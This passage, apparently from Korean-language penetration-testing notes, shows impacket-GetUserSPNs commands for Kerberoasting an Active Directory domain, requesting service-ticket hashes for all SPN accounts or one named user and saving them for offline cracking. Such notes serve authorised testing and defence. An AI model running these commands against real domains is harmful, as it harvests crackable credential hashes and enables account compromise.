...
```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile '<KERBEROAST_HASH_FILE>'
```

특정 사용자 기반 서비스 계정만 요청할 때는 전체 SPN 계정의 ticket을 요청하지 않는다.

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request-user <SPN_USER> -outputfile '<KERBEROAST_HASH_FILE>'
```
...
| `-request-user` | 지정한 사용자의 SPN에 대해 TGS hash 요청 |
